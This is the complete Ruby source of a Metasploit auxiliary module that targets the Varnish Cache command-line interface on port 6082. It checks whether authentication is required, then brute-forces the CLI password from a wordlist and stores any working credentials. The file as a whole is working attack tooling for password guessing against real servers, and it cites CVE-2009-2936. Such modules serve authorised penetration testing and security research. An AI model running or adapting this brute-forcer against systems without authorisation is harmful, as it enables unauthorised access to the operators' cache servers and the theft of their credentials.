##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/varnish'
require 'metasploit/framework/tcp/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Metasploit::Framework::Varnish::Client

  def initialize
    super(
      'Name'           => 'Varnish Cache CLI Login Utility',
      'Description'    => 'This module attempts to login to the Varnish Cache (varnishd) CLI instance using a bruteforce
                           list of passwords.',
      'References'     =>
        [
          [ 'OSVDB', '67670' ],
          [ 'CVE', '2009-2936' ],
          [ 'EDB', '35581' ],
          [ 'URL', 'https://www.varnish-cache.org/trac/wiki/CLI' ]
        ],
      'Author'         =>
        [
          'aushack', #original module
          'h00die <mike@shorebreaksecurity.com>' #updates and standardizations
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(6082),
        OptPath.new('PASS_FILE',  [ true, 'File containing passwords, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt') ])
      ])

    # We don't currently support an auth mechanism that uses usernames, so we'll ignore any
    # usernames that are passed in.
    @strip_usernames = true
  end

  def run_host(ip)
    # first check if we even need auth
    begin
      connect
      if !require_auth?
        print_good "#{ip}:#{rport} - Login Successful: No Authentication Required"
        close_session
        disconnect
        return
      else
        vprint_status "#{ip}:#{rport} - Authentication Required"
      end
      close_session
      disconnect
    rescue Rex::ConnectionError, EOFError, Timeout::Error
      print_error "#{ip}:#{rport} - Unable to connect"
    end

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      pass_file: datastore['PASS_FILE'],
      username: '<BLANK>'
    )
    scanner = Metasploit::Framework::LoginScanner::VarnishCLI.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      stop_on_success: true,
      connection_timeout: 10,
      framework: framework,
      framework_module: self,

    )
    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential.private}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential.private}"
      end
    end
  end
end
